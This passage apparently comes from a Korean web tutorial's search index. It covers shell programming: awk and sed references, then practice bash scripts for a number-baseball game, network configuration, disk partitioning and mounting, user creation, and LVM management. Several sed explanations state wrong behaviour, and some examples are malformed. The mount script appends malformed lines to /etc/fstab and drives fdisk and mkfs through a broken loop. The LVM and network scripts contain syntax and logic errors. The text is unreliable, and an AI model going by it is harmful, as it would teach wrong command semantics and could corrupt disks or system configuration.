/root/Shell/ $ var1=100 var2=200 $ export var1 $ f1() { echo \u0026#34;I am exported function\u0026#34; ;} $ f2() { echo \u0026#34;I am not exported function\u0026#34; ;} $ export -f f1 $ trap \u0026#39;\u0026#39; SIGINT $ trap \u0026#39;rm -f /tmp/tmpfile\u0026#39; SIGTERM $ tty /dev/pts/0 $ exec 3\u0026gt; devnull "}),a.add({id:277,href:'/docs/development/shell/shell80/',title:"awk",content:"Shell Programming    awk    AWK명령어는 Aho + Weinberger + Kernighan이 조합된 이름으로, awk는 파일로부터 레코드(record)를 선택하고, 선택된 레코드에 포함된 값을 조작하거나 데이터화하는 것을 목적으로 하는 프로그램을 의미한다.\n  awk 명령의 입력으로 지정된 파일로부터 데이터를 분류한 다음, 분류된 텍스트 데이터를 바탕으로 패턴 매칭 여부를 검사하거나 데이터 조작 및연산 등의 액션을 수행하고, 그 결과를 출력하는 기능을 수행한다.\n  awk는 awk programming language라는 프로그래밍 언어로 작성된 프로그램을 실행하며, 리눅스에서 쉘 스크립트로 작성된 파일이 리눅스 쉘에 실행되는 것을 떠올리면 awk가 awk programming language 문법으로 작성된 코드를 실행한다는 이 동일한 맥락이라 볼 수 있다.\n  awk는 기본적으로 입력 데이터를 라인(line) 단위의 레코드(record)로 인식하며, 각 레코드에 들어 있는 텍스트는 공백 문자(space, tab)으로 구분된 필드들로 분류되며, 이렇게 식별된 레코드 및 필드의 값들은 awk 프로그램에 의해 패턴 매칭 및 다양한 액션의 파라미터로 사용된다.\n     awk 명령어 옵션   awk 명령의 기본 형식은 하단과 같다.  $ awk [OPTION] [awk program] [ARGUMENT] OPTION -F : 필드 구분 문자 지정 -f : awk program 파일 경로 지정 -v : awk program에서 사용될 특정 variable 값 지정 awk program -f : 옵션이 사용되지 않은 경우, awk가 실행한 awk program 코드 지정 ARGUMENT : 입력 파일 지정 또는 variable 값 지정    awk program   awk 명령의 기본 형식은 보기와 같이 사용가능한 옵션이 많지는 않지만, 대신 awk 사용자는 옵션의 사용보다는 awk program의 작성에 많은 수고와 노고를 들어 스크립트 형식의 프로그램이 언어로 작성되기 때문에, 작성 방법이 다양하다.  pattrn { action } # 기본적인 awk program의 구조 awk [OPTION] \u0026#39;pattern { action }\u0026#39; [ARGUMENT] # 기본적인 awk 명령의 구조 $ awk \u0026#39;{ print }\u0026#39; ./file.txt # file.txt의 모든 레코드를 출력 $ awk \u0026#39;/p/\u0026#39; ./file.txt # file.txt에서 p를 포함하는 레코드를 출력   pattrn과 action은 모두 생략이 가능하며, pattern을 생략하는 경우는 모든 레코드가 적용되고, action을 생략하면 print가 적용된다.\n  또한 pattem이 생략되는 경우, 매칭 여부를 검사할 문자열 패턴 정보가 없기 때문에 모든 레코드가 선택되고, action을 생략하면, 기본 액션인 print가 실행되는 것을 의미한다.\n  pattern과 action에 작성되는 awk program코드엔느 다양한 표현식, 변수, 함수 등이 사용되며, 이 중 가장 중요한 변수를 레코드와 필드를 나태내는 변수로, 하나의 레코드는 $0, 레코드에 포함된 각 필드는 그 순서대로 $1, $2, \u0026hellip;, $n으로 지칭된다.\n  $ awk \u0026#39;length($0) \u0026gt; 10 { print $3, $4, $5 }\u0026#39; ./file.txt # 레코드 길이가 10 이상인 경우 세 번째, 네 번째, 다섯 번째 필드를 출력 $ awk \u0026#39;BEGIN { print \u0026#34;TITLE : Field value 1,2\u0026#34; } {print $1, $2} END {print \u0026#34;Finished\u0026#34;}\u0026#39; file.txt # BEGIN과 END는 특별 패턴으로 awk가 BEGIN 패턴을 식별하면 입력 데이터로부터 첫 번째 레코드를 처리하기 전까지 \u0026#34;BEGIN\u0026#34;에 지정된 액션을 실행하고, END패턴은 BEGIN과는 반대로 모든 레코드를 처리한 다음 END에 지정된 액션을 실행    awk 명령 사용 예제  $ awk [OPTION] [awk program] [ARGUMENT]    명령어 옵션 설명     awk \u0026lsquo;{ print }\u0026rsquo; File 파일의 전체 내용을 출력   awk \u0026lsquo;{ print $1 } File 필드 값을 출력   awk \u0026lsquo;{ print \u0026ldquo;STR\u0026rdquo;$1, \u0026ldquo;STR\u0026rdquo;$2 }\u0026rsquo; File 필드 값에 임의 문자열을 함께 출력   awk \u0026lsquo;/STR/\u0026rsquo; File 지정된 문자열을 포함하는 레코드만 출력   awk \u0026lsquo;$1 == 10 { print $2 }\u0026rsquo; File 특정 필드 값 비교를 통한 레코드 출력   awk \u0026lsquo;{sum += $3} END { print sum }\u0026rsquo; file 특정 필드들의 합 출력   awk \u0026lsquo;{ for (i=2; i\u0026lt;=NF; i++) total += $i }; END { print \u0026ldquo;TOTAL :\u0026rdquo; total } file 여러 필드의 합 출력   awk \u0026lsquo;{ sum = 0 } { sum += ($3+$4+$5) } { print $0, sum, sum/3 }\u0026rsquo; file 레코드 단위로 필드 합 및 평균 값 출력   awk \u0026lsquo;{print $1, $2, $3+2, $4, $5}\u0026rsquo; File 필드에 연산을 수행한 결과 출력   awk ' length($0) \u0026gt; 20\u0026rsquo; File 레코드 또는 필드의 문자열 길이를 검사   awk -f [AWK File] File 파일에 저장된 awk program 실행   awk -F \u0026lsquo;:\u0026rsquo; \u0026lsquo;{ print $1 }\u0026rsquo; File 필드 구분 문자열을 변경   awk \u0026lsquo;{ print $0 }\u0026rsquo; File awk 실행 결과 레코드 정렬   awk \u0026lsquo;NR == 2 { print $0; exit }\u0026rsquo; File 특정 레코드만 출력   awk \u0026lsquo;{ printf \u0026ldquo;%-3s %-8s %-4s %-4s %-4s\\n\u0026rdquo;, $1, $2, $3, $4, $5}\u0026rsquo; File 출력 필드 너비 지정   awk \u0026lsquo;{max =0; for (i=3; i\u0026lt;NF; i++) max = ($i \u0026gt; max) ? $i : max ; print max}\u0026rsquo; File 필드 중 최대 값 출력      "}),a.add({id:278,href:'/docs/development/shell/shell90/',title:"sed",content:"Shell Programming    SED   SED는 Stremlined editor를 의미하며, 해석하면 능률적인 편집기라는 의미     패턴 스페이스(Pattern space)와 홀드스페이스(Hold space)   sed 명령어는 동작시 내부적으로 두개 의 워크스페이스를 사용하는 데, 이 두 버퍼를 패턴 스페이스와 홀드 스페이스라고 한다.     패턴 버퍼\n 패턴 버퍼는 sed가 파일으 ㄹ라인단위로 읽을 때 그 읽힌 라인이 저장되는 임시 공간이며, 우리가 sed 명령어로 출력하라 하면 여기있는 버퍼 내용을 출력하는 것이고, 조작을 하면 저장되어 있는 내용을 조작하는 것으로, 원본을 건드는 설저잉 아닌, 현재 내가 담고 있는 정보를 가지고 오겠다는 의미로 해석된다.    홀드 스페이스\n 홀드 스페이스는 패턴 버퍼처럼 짧은 순간 임시 버퍼가 아닌, 좀 더 길게 가지고 있는 저장소를 의미하며, 2라인 작업중이라도 1라인을 기억하고 있는 것처럼 특정 내용을 홀드 스페이스에 저장하면, sed가 당므 행을 읽더라도나중에 내가 원할 때 불러와 재사용 할 수 있는 버퍼가 홀드 버퍼를 의미한다.       sed 명령어 자주쓰는 대표적 사용법   기본적으로 편집기가 기능을 다 해주다보니 sed subcommand 즉, sed와 같이 쓰이는 명령어 조합이 굉장히 많다.  $ sed -n \u0026#39;1p\u0026#39; [파일명] # [파일명]의 첫 번째 행만을 출력한다.  $ sed -n \u0026#39;1,3p\u0026#39; [파일명] # [파일명]의 첫 번째 행부터 3번째 행까지만을 출력한다.  $ sed -n \u0026#39;8,$p\u0026#39; [파일명] # [파일명]의 첫 번째 행부터 끝까지 출력한다. ($는 끝을 의미) $ sed -n -e \u0026#39;1p\u0026#39; -e \u0026#39;8,$p\u0026#39; [파일명] # [파일명]의 첫 번째 행을 출력하고 마지막 8번째 행부터 끝까지 출력    특정 단어로 시작하는 행 추출   보통 로그파일의 경우 데이터들의 구별을 위해 unique한 값이 맨 앞에 붙는 경우가 많다.  $ sed -n \u0026#39;/^107/p\u0026#39; [파일명] # [파일명]에서 107로 시작하는 줄만을 출력 $ sed -n \u0026#39;/103/p\u0026#39; [파일명] # [파일명]에서 103을 포함하고 있는 행들을 출력    파일에서 공백으로 이루어지거나 빈 줄 제거  $ sed \u0026#39;/^$d\u0026#39; [파일명] # [파일명]에서 빈 라인들을 지운 후 내용을 출력한다. $ sed \u0026#39;/^$d\u0026#39; [파일명] \u0026gt; [new 파일명] # [파일명]에서 빈 라인들을 지운 후 새로운 파일에 저장한다. $ sed \u0026#39;/^*$/d\u0026#39; [파일명] \u0026gt; [new 파일명] # [파일명]에서 빈 라인들이나 공백으로 채워진 행들을 삭제후 새로운 파일에 저장한다.    단어 치환  $ sed \u0026#39;s/[바뀔내용]/[바꿀내용]/g\u0026#39; [파일명] # [파일명]에서 [바뀔내용]을 [바꿀내용]으로 변경한다. $ sed \u0026#39;s/[바뀔내용]/[바꿀내용]/g\u0026#39; [파일명] \u0026gt; [new 파일명] # [파일명]에서 [바뀔내용]을 [바꿀내용]으로 변경 후 새로운 파일에 저장한다. $ sed \u0026#39;s/[바뀔내용]/[바꿀내용]/g\u0026#39; [파일명] \u0026gt; [new 파일명] # [파일명]에서 알파뱃의 대소문자를 무시하고 [바뀔내용]을 [바꿀내용]으로 변경 후 새로운 파일에 저장한다.    SED subcommand 명령어 종류와 의미     Subcommand 의미     a\\ 현재 행에 하나 이상의 새로운 행을 추가   c\\ 현재 행의 내용을 새로운 내용으로 교체   d 행을 삭제   i 현재 행의 위에 텍스트를 삽입   h 패턴 스페이스의 내용을 홀드 스페이스로 복사   H 패턴 스페이스의 내용을 홀드 스페이스에 추가   g 홀드 스페이스의 내용을 패턴 스페이스에 복사 (덮어쓰기)   G 홀드 스페이스의 내용을 패턴 스페이스에 복사 (이어쓰기)   I 출력되지 않는 특수문자를 명확하게 출력   P 행을 출력   n 다음 입력 행을 첫 번째 명령어가 아닌 다음 명령어에서 처리   q sed를 종료   r 파일로부터 행을 읽음   ! 선택된 행을 제외한 나머지 전체 행에 명령어를 적용   s 문자열을 치환       sed s와 같이 쓰는 치환플래그    Subcommand 의미     g 치환의 범위를 행 전체로 지정   p 행을 출력   w 파일에 저장   x 홀드 버퍼와 패턴 스페이스이 내용을 서로 바꾼다   y 한 문자를 다른 문자로 변환         사용예시  $ sed -n \u0026#39;/love/p\u0026#39; file # file에서 love가 포함된 행들을 출력한다. $ sed -n \u0026#39;/west/ ,/east/p\u0026#39; file # file에서 west가 나오는 행과 east가 나오는 행 사이의 모든 행들이 출력 $ sed -n \u0026#39;3,/^employee/p\u0026#39; file # file의 3번째 해우터 employee로 시작되는 행까지 출력 $ sed \u0026#39;3d\u0026#39; file # file의 3번쨰 행을 삭제 후 출력 $ sed \u0026#39;5,$d\u0026#39; file # file의 5번째 행부터 마지막행까지 삭제 후 출력 $ sed \u0026#39;$d\u0026#39; file # file의 모든 행을 삭제후 출력 $ sed \u0026#39;/apple/d\u0026#39; file # apple을 포함하는 모든 행을 삭제 후 출력 $ sed \u0026#39;s/clere/clear/g\u0026#39; file # file에서 clere을 clear로 변경 후 출력 $ sed -n \u0026#39;s/clere/clear/gp\u0026#39; file # file에서 변경이 일어난 행들만을 출력 $ cat file | sed \u0026#39;s/ */ /g\u0026#39; $ sed -i \u0026#39;s / */ /g\u0026#39; file # 공백을 모두 여백으로 치환하여 출력 $ sed \u0026#39;/ref/r addfile\u0026#39; file # file에서 ref 단어를 찾으면 그 패턴을 찾은 행 뒤에 addfile의 내용을 붙여 출력 $ sed -n \u0026#39;north/w outputfile\u0026#39; file # file에서 north 라는 패턴이 포함된 행을 찾아 그 행들을 outputfile에 저장 $ sed \u0026#39;END$/a\\THANK YOU FOR READING\u0026#39; file # file에서 END로 끝나는 행을 찾아 그 다음에 \u0026#39;THANK YOU FOR READING\u0026#39;을 추가 $ sed -e \u0026#39;/northeast/h\u0026#39; -e \u0026#39;$G\u0026#39; file # file에서 northeast라는 단어를 찾은 후 그 행들을 홀드스페이스에 저장해 놓은 후, 그 내용들을 마지막에 복사 (northeast가 텍스트 맨 마지막에 복사됨)   "}),a.add({id:279,href:'/docs/development/shell/shell100/',title:"연습문제",content:"Shell Programming    연습문제 정리  구구단 # gugu.sh #!/bin/bash for i in {1..9}; do for j in {1..9}; do echo $i \u0026#34;X\u0026#34; $j \u0026#34;=\u0026#34; `expr $i \\* $j` done done    야구게임 #!/bin/bash  Solution(){ Solution=() i=0 while [ $i -le 3 ]; do Solution[$i]=$((RANDOM% 9+1)) if [ $i -eq 3 ]; then if [ ${Solution[3]} -eq ${Solution[0]} -o ${Solution[3]} -eq ${Solution[1]} -o ${Solution[3]} -eq ${Solution[2]} ]; then Solution[$i]=$((RANDOM% 9+1)) else ((i++)) fi fi if [ $i -eq 2 ]; then if [ ${Solution[2]} -eq ${Solution[0]} -o ${Solution[2]} -eq ${Solution[1]} ]; then Solution[$i]=$((RANDOM% 9+1)) else ((i++)) fi fi if [ $i -eq 1 ]; then if [ ${Solution[0]} -eq ${Solution[1]} ]; then Solution[$i]=$((RANDOM% 9+1)) else ((i++)) fi fi if [ $i -eq 0 ]; then ((i++)) fi done echo ${Solution[@]} } Count=0 Score(){ Out=0 Ball=0 Strike=0 if [ $num1 -eq ${Solution[0]} ]; then ((Strike++)) elif [ $num1 -eq ${Solution[1]} -o $num1 -eq ${Solution[2]} -o $num1 -eq ${Solution[3]} ]; then ((Ball++)) else ((Out++)) fi if [ $num2 -eq ${Solution[1]} ]; then ((Strike++)) elif [ $num2 -eq ${Solution[0]} -o $num2 -eq ${Solution[2]} -o $num2 -eq ${Solution[3]} ]; then ((Ball++)) else ((Out++)) fi if [ $num3 -eq ${Solution[2]} ]; then ((Strike++)) elif [ $num3 -eq ${Solution[1]} -o $num3 -eq ${Solution[0]} -o $num3 -eq ${Solution[3]} ]; then ((Ball++)) else ((Out++)) fi if [ $num4 -eq ${Solution[3]} ]; then ((Strike++)) elif [ $num4 -eq ${Solution[1]} -o $num4 -eq ${Solution[2]} -o $num4 -eq ${Solution[0]} ]; then ((Ball++)) else ((Out++)) fi echo \u0026#34; Strike : $Strike\u0026#34; echo \u0026#34; Ball : $Ball\u0026#34; echo \u0026#34; Out : $Out\u0026#34; ((Count++)) if [ $Strike -eq 4 ]; then echo \u0026#34;수고하셨습니다.\u0026#34; echo \u0026#34;전체 게임판수 : $Count\u0026#34; else Game_Start fi } Game_Start(){ echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;야구 게임의 Roll입니다!\u0026#34; echo \u0026#34;x x x x 형태로 원하는 숫자를 4개 입력하세요!\u0026#34; echo \u0026#34;숫자는 0 ~ 9의 숫자 중 하나로 구성되며 증복되면 안됩니다!\u0026#34; echo \u0026#34;5번째 이후에 숫자는 사라집니다!\u0026#34; read num1 num2 num3 num4 num5 arg=($num1 $num2 $num3 $num4 $num5) Rule Score } Rule(){ if [ -z \u0026#34;$num1\u0026#34; -o -z \u0026#34;$num2\u0026#34; -o -z \u0026#34;$num3\u0026#34; -o -z \u0026#34;$num4\u0026#34; ]; then echo \u0026#34;형식에 맞게 다시 입력하세요!\u0026#34; Game_Start fi if [ $num1 -ge 10 -o $num1 -le 0 -o $num2 -ge 10 -o $num2 -le 0 -o $num3 -ge 10 -o $num3 -le 0 -o $num4 -ge 10 -o $num4 -le 0 -o $num1 -eq $num2 -o $num1 -eq $num3 -o $num1 -eq $num4 -o $num2 -eq $num3 -o $num2 -eq $num4 -o $num3 -eq $num4 ]; then echo \u0026#34;형식에 맞춰 다시 입력하세요!\u0026#34; Game_Start fi } main(){ Solution Game_Start } main    Network 정적 자동설정 스크립트 #!/bin/bash Network_Interface() { echo \u0026#34; 1. interface Type : dhcp or static ( default : static ) 2. interface name : choose ( default : auto ) 3. IP : xxx.xxx.xxx.xxx 4. Netmask : xxx.xxx.xxx.xxx 5. gateway : xxx.xxx.xxx.xxx 6. DNS : xxx.xxx.xxx.xxx ( default : x ) ex) static ens33 192.168.10.10 255.255.255.0 192.168.10.2 8.8.8.8 기본 값 입력을 원할시 : 0 \u0026#34; read Interface_Type Interface_Name IP Netmask Gateway DNS echo $Null if [ $Interface_Type -eq 0 ]; then Interface_Type=static elif [ $Interface_Type != \u0026#34;dhcp\u0026#34; -o $Interface_Type != \u0026#34;static\u0026#34; ]; then echo \u0026#34;Interface_Type을 잘못 입력했습니다.\u0026#34; echo \u0026#34;처음으로 돌아갑니다.\u0026#34; Network_Interface fi if [ $Interface_Name == 0 ]; then Interface_Which=`ls /etc/sysconfig/network-scripts/ifcfg-* | grep ifcfg-e` Interface_Name=${Interface_Which#*ifcfg-} else Interface_Which=`ls /etc/sysconfig/network-scripts/ifcfg-* | grep ifcfg-e` fi UUID=`cat $Interface_Which | grep UUID` UUID=${UUID#*UUID=} # 앞은 %%i* 키워드 # 뒤는 #*i 키워드 echo \u0026#34; TYPE=Ethernet PROXY_METHOD=none BROWSER_ONLY=no BOOTPROTO=$Interface_TypeDEFROUTE=yes IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=$Interface_NameUUID=$UUIDDEVICE=$Interface_NameONBOOT=yes IPADDR=$IPNETMASK=$NetmaskGATEWAY=$GatewayDNS=$DNS\u0026#34; \u0026gt; \u0026#34;$Interface_Which\u0026#34; } main(){ Network_Interface systemctl restart network } main    마운트 및 등록 스크립트 #!/bin/bash  for i in {1..32}; do echo \u0026#34;- - -\u0026#34; \u0026gt; \u0026#34;/sys/class/scsi_host/host$i/scan\u0026#34; done Mount(){ if [ ! -d ~/Mountlist ]; then mkdir ~/Mountlist echo `ls /dev/* \u0026gt; ~/Mountlist/Mountlist.txt` Mount elif [ -d ~/Mountlist -a ! -f ~/Mountlist/Mountlist.txt ]; then echo `ls /dev/* \u0026gt; ~/Mountlist/Mountlist.txt` Mount elif [ -d ~/Mountlist -a -f ~/Mountlist/Mountlist.txt ]; then echo `ls /dev/* \u0026gt; ~/Mountlist/Mountlist2.txt` fi diff ~/Mountlist/Mountlist.txt ~/Mountlist/Mountlist2.txt | grep /dev/ \u0026gt; ~/Mountlist/Mount.txt sed -e \u0026#39;s/\u0026gt; //g\u0026#39; ~/Mountlist/Mount.txt \u0026gt; ~/Mountlist/Mount2.txt rm -rf ~/Mountlist/Mount.txt Mount=`cat ~/Mountlist/Mount2.txt` fdisk } fdisk(){ echo Num=1 for i in $Mount; do cat ~/Mountlist/Partition.txt | grep Create \u0026gt; ~/Mountlist/Create.txt Create_Partition_Number=`sed -e \u0026#39;s/Create Partition Number 0~4 ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$Create_Partition_Number\u0026#34; -o \u0026#34;Create_Partition_Number\u0026#34; == 0 ]; then Create_Partition_Number=1 fi cat ~/Mountlist/Partition.txt | grep type \u0026gt; ~/Mountlist/Create.txt Partition_type=`sed -e \u0026#39;s/Partition type ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$Partition_type\u0026#34; ]; then Partition_type=p elif [ \u0026#34;$Partition_type\u0026#34; == \u0026#34;p\u0026#34; -o \u0026#34;$Partition_type\u0026#34; == \u0026#34;e\u0026#34; ]; then echo \u0026#34;잘못된 설정을 기입하여 기본설정으로 변경합니다.\u0026#34; Partition_type=p fi cat ~/Mountlist/Partition.txt | grep First \u0026gt; ~/Mountlist/Create.txt First_sector=`sed -e \u0026#39;s/First sector ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$First_sector\u0026#34; ]; then First_sector=2048 fi cat ~/Mountlist/Partition.txt | grep Last \u0026gt; ~/Mountlist/Create.txt Last_sector=`sed -e \u0026#39;s/Last sector ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$Last_sector\u0026#34; ]; then Last_sector=`expr $First_sector + 10240` fi cat ~/Mountlist/Partition.txt | grep Select \u0026gt; ~/Mountlist/Create.txt Select_Partition_Number=`sed -e \u0026#39;s/Select Partition Number ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$Select_Partition_Number\u0026#34; ]; then Select_Partition_Number=8e fi cat ~/Mountlist/Partition.txt | grep Point \u0026gt; ~/Mountlist/Create.txt Mount_Point=`sed -e \u0026#39;s/Mount Point ://g\u0026#39; ~/Mountlist/Create.txt` cat ~/Mountlist/Partition.txt | grep Filesystem \u0026gt; ~/Mountlist/Create.txt Mount_Filesystem=`sed -e \u0026#39;s/Mount Filesystem ://g\u0026#39; ~/Mountlist/Create.txt` if [ -z \u0026#34;$Mount_Filesystem\u0026#34; ]; then Mount_Filesystem=ext3 fi echo \u0026#34;살아있음!\u0026#34; fdisk $i for go in n $Partition_type $Create_Partition_Number $First_sector $Last_sector t $Select_Partition_Number w; do echo $go done mkfs.$Mount_Filesystem $i$Num mount $Mount_Point echo $i$Num $Mount_Point ext3 defaults 0 0 (NUM++) \u0026gt;\u0026gt; /etc/fstab done rm -rf ~/Mountlist/Mount2.txt ~/Mountlist/Create.txt } Main(){ Mount } Main ~/Mountlist/Partition.txt Create Partition Number 0~4 : # 생성할 파티션의 수 # default : 1 Partition type : p # 생성할 파티션 타입 # default : p Partition Number : 1 # 생성할 파티션의 번호 # default : 1 2 3 4 First sector : # 파티션의 시작용량할당 # default : 2048 Last sector : # 파티션의 끝사용용량할당 # default : First sector + 10GB # + 1024KB # + 100MB # + 10GB Select Partition Number : # dafault : 8e ( Linux LVM ) # 82 : Linux swap # 83 : Linux # 83 : Linux LVM ..... Mount Point : ~/test # 마운트할 장소 Mount Filesystem : ext3 # default ext3    User 생성 스크립트 #!/bin/bash  Useradd(){ UserName=`awk \u0026#39;/UserName/\u0026#39; UserTemplates.txt` UserName=${UserName#*UserName :} if [ -z $UserName ]; then echo \u0026#34;User 이름을 확인하세요! \u0026#34; fi UserName=`echo \u0026#34; $UserName\u0026#34; | tr -d \u0026#39; \u0026#39;` Password=`awk \u0026#39;/Password/\u0026#39; UserTemplates.txt` Password=${Password#*Password :} UserShell=`awk \u0026#39;/UserShell/\u0026#39; UserTemplates.txt` UserShell=${UserShell#*UserShell :} if [ -z $UserShell ]; then UserShell=\u0026#39;/bin/bash\u0026#39; fi HomeWhich=`awk \u0026#39;/HomeWhich/\u0026#39; UserTemplates.txt` HomeWhich=${HomeWhich#*HomeWhich :} if [ -z $HomeWhich ]; then HomeWhich=\u0026#34;/home/$UserName\u0026#34; HomeWhich=`echo \u0026#34;$HomeWhich\u0026#34; | tr -d \u0026#39; \u0026#39;` fi HomeDir=`awk \u0026#39;/HomeDir/\u0026#39; UserTemplates.txt` HomeDir=${HomeDir#*HomeDir :} if [ -z $HomeDir ]; then HomeDir=\u0026#39;-m -d \u0026#39; elif [ $HomeDir == \u0026#34;-M\u0026#34; ]; then HomeWhich=\u0026#39;\u0026#39; HomeDir=\u0026#39;\u0026#39; else HomeDir=\u0026#39;-m -d \u0026#39; fi UserGroup=`awk \u0026#39;/UserGroup/\u0026#39; UserTemplates.txt` UserGroup=${UserGroup#*UserGroup :} if [ -z $UserGroup ]; then UserGroup=\u0026#39;-N\u0026#39; fi UserUID=`awk \u0026#39;/UserUID/\u0026#39; UserTemplates.txt` UserUID=${UserUID#*UserUID :} if [ ! -z $UserUID ]; then UserUID=\u0026#34;-u $UserUID\u0026#34; fi GroupUID=`awk \u0026#39;/GroupUID/\u0026#39; UserTemplates.txt` GroupUID=${GroupUID#*GroupUID :} if [ ! -z $GroupUID ]; then GroupUID=\u0026#34;-g $GroupUID\u0026#34; fi useradd -n $UserName -s $UserShell $HomeDir $HomeWhich $UserGroup $UserUID $GroupUD if [ ! -z $Password ]; then echo \u0026#34;$Password\u0026#34; | passwd --stdin \u0026#34;$UserName\u0026#34; echo \u0026#34;Password 설정완료\u0026#34; fi } main(){ Useradd } main UserTemplates.txt UserName : # 유저의 이름 (필수 입력사항) Password : # 로그인 시 사용할 비밀번호 # default : 없음 UserShell : # 유저가 사용할 쉘 # default : /bin/bash HomeDir : # 홈 디렉터리 생성 여부 ( 생성 : -m | 생성안함 : -M ) # default : m (생성) HomeWhich : # 홈 디렉터리의 위치 # default : /home/ UserGroup : # 개인그룹 생성여부 (생성하지 않음 : -N) # default : -N UserUID : # UID를 수동으로 결정 # default : auto GroupUID : # 수동으로 그룹 ID를 지정 # default : auto    PV VG LV 스크립트 #!/bin/bash  PV(){ echo \u0026#34;\u0026#34; echo \u0026#34;PV 생성 및 제거\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;생성할 PV 디바이스 명을 입력하세요.\u0026#34; echo \u0026#34;뛰어쓰기로 구분됩니다.\u0026#34; echo \u0026#34;ex /dev/sda1 /dev/sda2 ...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;삭제를 원할 시에는 앞에 -r을 입력하고 삭제할 PV 디바이스를 입력하세요.\u0026#34; echo \u0026#34;ex -r /dev/sda1 /dev sda2 ...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;0. 메인메뉴로 돌아가기\u0026#34; read PV if [ ${PV[0]} == \u0026#34;-r\u0026#34; ]; then for i in ${PV[@]}; do pvremove $i echo \u0026#34;PV $i의삭제가 완료되었습니다.\u0026#34; done elif [ ${PV[0] == \u0026#34;0\u0026#34;} ]; then continue else for i in ${PV[@]}; do pvcreate $i echo \u0026#34;PV의 $i의생성이 완료되었습니다.\u0026#34; done fi main } VG() { echo \u0026#34;\u0026#34; echo \u0026#34;VG 생성 및 제거\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;생성할 vg명과 디바이스를 순서에 맞게 입력하세요.\u0026#34; echo \u0026#34;뛰어쓰기로 구분됩니다.\u0026#34; echo \u0026#34;ex vg1 /dev/sda1 /dev/sda2 ...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;삭제를 원할 시에는 앞에 -r을 입력하고 삭제할 VG 디바이스를 입력하세요.\u0026#34; echo \u0026#34;ex -r vg1 vg2 ...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;0. 메인메뉴로 돌아가기\u0026#34; read VG if [ ${VG[0]} == \u0026#34;-r\u0026#34; ]; then for i in ${PV[@]}; do vgremove $i echo \u0026#34;VG $i의삭제가 완료되었습니다.\u0026#34; done elif [ ${VG[0] == \u0026#34;0\u0026#34;} ]; then continue else for i in ${PV[@]}; do vgcreate $i echo \u0026#34;VG의 $i의생성이 완료되었습니다.\u0026#34; done fi main } LV() { echo \u0026#34;\u0026#34; echo \u0026#34;LV 생성 및 제거\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;lv 생성을 위해서는 lv의 용량, vg, lv명을 순서에 맞게 입력하세요.\u0026#34; echo \u0026#34;뛰어쓰기로 구분됩니다.\u0026#34; echo \u0026#34;ex -L 10G vg1 lv1\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;lv 수정을 위해서는 앞에 -n을 입력하고 lv명 바뀔 lv명을 입력하세요.\u0026#34; echo \u0026#34;ex -n vg1 vvg1\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;lv의 용량을 수정하기 위해서는 앞에 -S를 입력 후 -L 이나 -I를 입력하세요.\u0026#34; echo \u0026#34;ex -S -L 12G lv1\u0026#34; echo \u0026#34;ex -S -L 1G lv1\u0026#34; echo \u0026#34;ex -S -I +100%FREE lv1\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;삭제를 원할 시에는 앞에 -r을 입력하고 삭제할 LV 명을 입력하세요.\u0026#34; echo \u0026#34;ex -r lv1 lv2 ...\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;0. 메인메뉴로 돌아가기\u0026#34; read LV if [ $Call == \u0026#34;0\u0026#34; ]; then PV elif [ $Call == \u0026#34;1\u0026#34; ]; then for i in ${PV[@]} do `\u0026#34;echo pvscan | grep $i\u0026#34;` done elif [ $Call == \u0026#34;2\u0026#34; ]; then VG elif [ $Call == \u0026#34;3\u0026#34; ]; then for i in ${VG[@]} do `echo \u0026#34;vgscan | grep $i\u0026#34;` done elif [ $Call == \u0026#34;4\u0026#34; ]; then LV elif [ $Call == \u0026#34;5\u0026#34; ]; then for i in ${LV[@]} do `echo \u0026#34;lvscan | grep $i\u0026#34;` done elif [ $Call == \u0026#34;6\u0026#34; ]; then RAID elif [ $Call == \u0026#34;7\u0026#34; ]; then for i in ${RAID[@]} do `echo \u0026#34;raidscan | grep $i\u0026#34;` done elif [ $Call == \u0026#34;8\u0026#34; ]; then ((Kron++)) fi main } RAID(){ main } main(){ Korn=0 while [ Korn == \u0026#34;0\u0026#34; ]; do echo \u0026#34;\u0026#34; echo \u0026#34;PV, VG, LV을 생성하기 위한 스크립트 파일입니다.\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;0: PV 생성 및 제거\u0026#34; echo \u0026#34;1: PV 확인\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;2: VG 생성 및 제거\u0026#34; echo \u0026#34;3: VG 확인\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;4: LV 생성 및 제거\u0026#34; echo \u0026#34;5: LV 확인\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;6: RAID 생성 및 제거\u0026#34; echo \u0026#34;7: RAID 확인\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;8: 종료\u0026#34; echo \u0026#34;메뉴는 언제나 사용가능합니다.\u0026#34; echo \u0026#34;원하시는 메뉴를 선택해주세요.\u0026#34; read Call if [ $Call == \u0026#34;0\u0026#34; ]; then PV elif [ $Call == \u0026#34;1\u0026#34; ]; then for i in ${PV[@]} echo `pvscan | grep $i` fi elif [ $Call == \u0026#34;2\u0026#34; ]; then VG elif [ $Call == \u0026#34;3\u0026#34; ]; then for i in ${VG[@]} echo `vgscan | grep $i` fi elif [ $Call == \u0026#34;4\u0026#34; ]; then LV elif [ $Call == \u0026#34;5\u0026#34; ]; then for i in 